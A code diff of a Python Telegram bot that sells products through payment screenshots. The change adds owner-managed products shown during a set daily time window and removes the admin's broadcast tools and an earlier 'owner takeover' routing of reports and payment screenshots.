+                dtime.fromisoformat(start_t)
+                dtime.fromisoformat(end_t)
+                
+                DB_STATE["time_override"]["start_time"] = start_t
+                DB_STATE["time_override"]["end_time"] = end_t
+                save_db()
+                markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Time Menu", callback_data="own_time_prod_menu"))
+                update_owner_panel(OWNER_ID, f"✅ **Time Frame Set:** `{start_t}` to `{end_t}`", markup)
+            except Exception:
+                markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Time Menu", callback_data="own_time_prod_menu"))
+                update_owner_panel(OWNER_ID, "❌ **Invalid format!** Format must be `HH:MM-HH:MM` (e.g. `02:00-06:00`).", markup)
+            return
+
+        elif state == "OWN_ADD_PROD_NAME" and message.text:
+            new_id = f"own_{len(DB_STATE['owner_products']) + 1}"
+            new_pos = len(DB_STATE["owner_products"]) + 1
+            DB_STATE["owner_products"].append({
+                "id": new_id, 
+                "name": message.text, 
+                "desc": "", 
+                "videos": [], 
+                "link": "https://example.com",
+                "position": new_pos,
+                "pay_msg": "" 
+            })
+            save_db()
+            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_time_prod_menu"))
+            update_owner_panel(OWNER_ID, f"✅ Owner Button `{message.text}` Created!\n\n🔗 **Send delivery link:**", markup)
+            user_states[user_id] = f"OWN_ADD_PROD_LINK_{new_id}"
+            return
+
+        elif state.startswith("OWN_ADD_PROD_LINK_") and message.text:
+            p_id = state.replace("OWN_ADD_PROD_LINK_", "")
+            prod = next((p for p in DB_STATE["owner_products"] if p["id"] == p_id), None)
+            if prod:
+                prod["link"] = message.text
+                save_db()
+            user_states.pop(user_id, None)
+            show_main_owner_menu(OWNER_ID)
+            return
+
+    # --- ADMIN INPUT HANDLING ---
+    if user_id == ADMIN_ID:
         if state:
             try: bot.delete_message(ADMIN_ID, message.message_id)
             except: pass
@@ -907,101 +1087,6 @@ def handle_all_inputs(message):
             show_main_admin_menu(ADMIN_ID)
             return
 
-        elif state == "WAITING_CUSTOM_BROADCAST":
-            user_states.pop(user_id, None)
-            update_admin_panel(ADMIN_ID, "🚀 Broadcasting message to all users... Please wait.", None)
-            success_count = 0
-            fail_count = 0
-            for u_id in DB_STATE.get("users", []):
-                if u_id in DB_STATE.get("blocked_users", []): continue
-                try:
-                    if message.content_type == 'text':
-                        bot.send_message(u_id, message.text, parse_mode="Markdown")
-                    elif message.content_type == 'photo':
-                        bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
-                    elif message.content_type == 'video':
-                        bot.send_video(u_id, message.video.file_id, caption=message.caption, parse_mode="Markdown")
-                    elif message.content_type == 'document':
-                        bot.send_document(u_id, message.document.file_id, caption=message.caption, parse_mode="Markdown")
-                    success_count += 1
-                except Exception as e: 
-                    fail_count += 1
-            
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
-            update_admin_panel(ADMIN_ID, f"✅ **Custom Broadcast Completed!**\n\n- Successfully sent: {success_count}\n- Failed: {fail_count}", markup)
-            return
-
-        elif state == "WAITING_AUTOBC_MSG":
-            user_states.pop(user_id, None)
-            m_type = message.content_type
-            f_id = None
-            txt = message.caption or message.text or ""
-
-            if m_type == 'photo':
-                f_id = message.photo[-1].file_id
-            elif m_type == 'video':
-                f_id = message.video.file_id
-            elif m_type == 'document':
-                f_id = message.document.file_id
-            elif m_type == 'text':
-                txt = message.text
-
-            DB_STATE["auto_bc"]["message_type"] = m_type
-            DB_STATE["auto_bc"]["file_id"] = f_id
-            DB_STATE["auto_bc"]["text"] = txt
-            save_db()
-
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton("🔙 Back to Auto BC Menu", callback_data="adm_autobc_menu"))
-            update_admin_panel(ADMIN_ID, "✅ **Auto Broadcast Message Saved Successfully!**\n\nNow make sure the status is turned **ON**.", markup)
-            return
-
-        elif state == "WAITING_AUTOBC_CUSTOM_TIME" and message.text:
-            user_states.pop(user_id, None)
-            try:
-                custom_secs = int(message.text.strip())
-                if custom_secs < 1:
-                    custom_secs = 10
-                DB_STATE["auto_bc"]["interval_seconds"] = custom_secs
-                save_db()
-                markup = InlineKeyboardMarkup()
-                markup.row(InlineKeyboardButton("🔙 Back to Auto BC Menu", callback_data="adm_autobc_menu"))
-                update_admin_panel(ADMIN_ID, f"✅ **Custom Timer Set Successfully!**\n\nInterval: `{custom_secs}` Seconds.", markup)
-            except ValueError:
-                markup = InlineKeyboardMarkup()
-                markup.row(InlineKeyboardButton("🔙 Back to Auto BC Menu", callback_data="adm_autobc_menu"))
-                update_admin_panel(ADMIN_ID, "❌ **Invalid number!** Please send only digits (e.g., 30 for 30 seconds).", markup)
-            return
-
-        elif state == "WAITING_BUYERS_BROADCAST":
-            user_states.pop(user_id, None)
-            update_admin_panel(ADMIN_ID, "👑 Broadcasting special message to buyers... Please wait.", None)
-            success_count = 0
-            fail_count = 0
-            sent_users = set()
-            for b in DB_STATE.get("buyers", []):
-                u_id = b.get("user_id")
-                if u_id in sent_users or u_id in DB_STATE.get("blocked_users", []): continue
-                sent_users.add(u_id)
-                try:
-                    if message.content_type == 'text':
-                        bot.send_message(u_id, message.text, parse_mode="Markdown")
-                    elif message.content_type == 'photo':
-                        bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
-                    elif message.content_type == 'video':
-                        bot.send_video(u_id, message.video.file_id, caption=message.caption, parse_mode="Markdown")
-                    elif message.content_type == 'document':
-                        bot.send_document(u_id, message.document.file_id, caption=message.caption, parse_mode="Markdown")
-                    success_count += 1
-                except Exception as e:
-                    fail_count += 1
-
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
-            update_admin_panel(ADMIN_ID, f"✅ **Buyers Broadcast Completed!**\n\n- Successfully sent: {success_count}\n- Failed: {fail_count}", markup)
-            return
-
         elif state == "WAITING_RESTORE_CODE" and message.text:
             try:
                 restored_data = json.loads(message.text)
@@ -1077,37 +1162,19 @@ def handle_all_inputs(message):
             show_main_admin_menu(ADMIN_ID)
             return
 
-        # --- OWNER TAKEOVER STATES ---
-        elif state in ("ADM_TO_SETSTART", "ADM_TO_SETEND") and message.text:
-            try:
-                datetime.datetime.strptime(message.text.strip(), "%H:%M")
-                key = "start_time" if state == "ADM_TO_SETSTART" else "end_time"
-                DB_STATE["takeover"][key] = message.text.strip()
-                save_db()
-                show_main_admin_menu(ADMIN_ID)
-            except ValueError:
-                update_admin_panel(ADMIN_ID, "❌ Invalid format! Use HH:MM (e.g. 02:00)", None)
-            return
-
-        elif state == "ADM_TO_SETWELCOME" and message.text:
-            DB_STATE["takeover"]["welcome_msg"] = message.text
-            save_db()
-            show_main_admin_menu(ADMIN_ID)
-            return
-
+    # --- USER ACTIONS ---
     if state == "WAITING_REPORT":
         user_states.pop(user_id, None)
         bot.send_message(user_id, "✅ Your report has been sent to admin.")
         username = message.from_user.username
         user_tag = f"@{username}" if username else "No Username"
-        target = get_current_admin()  # takeover active -> Owner ko jayega
-        bot.send_message(target, f"📩 **Report from {user_tag} (`{user_id}`):**\n\n{message.text}\n\n*Tip: Reply directly to this message to answer the user.*", parse_mode="Markdown")
+        bot.send_message(ADMIN_ID, f"📩 **Report from {user_tag} (`{user_id}`):**\n\n{message.text}\n\n*Tip: Reply directly to this message to answer the user.*", parse_mode="Markdown")
 
     elif state.startswith("WAITING_SCREENSHOT_"):
         prod_id = state.replace("WAITING_SCREENSHOT_", "")
         if message.content_type == 'photo':
             user_states.pop(user_id, None)
-            bot.send_message(user_id, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁....   𝗣𝗟𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻. ")
+            bot.send_message(user_id, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁....   𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻. ")
 
             photo_id = message.photo[-1].file_id
             adm_markup = InlineKeyboardMarkup()
@@ -1117,24 +1184,23 @@ def handle_all_inputs(message):
                 InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{user_id}")
             )
             
-            prod = next((p for p in get_active_products() if p["id"] == prod_id), None)
+            all_p = DB_STATE.get("products", []) + DB_STATE.get("owner_products", [])
+            prod = next((p for p in all_p if p["id"] == prod_id), None)
             prod_name = prod["name"] if prod else "Unknown Product"
 
             username = message.from_user.username
             user_tag = f"@{username}" if username else "No Username"
             user_name = message.from_user.first_name or "User"
 
-            pay_target = get_current_admin()  # takeover active -> Owner ke pass jayega
-
             try:
                 bot.send_photo(
-                    pay_target, 
+                    ADMIN_ID, 
                     photo_id, 
                     caption=f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {prod_name}\n👤 **User:** {user_tag}\n📛 **Name:** {user_name}\n🆔 **ID:** `{user_id}`", 
                     reply_markup=adm_markup,
                     parse_mode="Markdown"
                 )
-            except Exception as e:
+            except Exception:
                 pass
 
 @app.route('/')
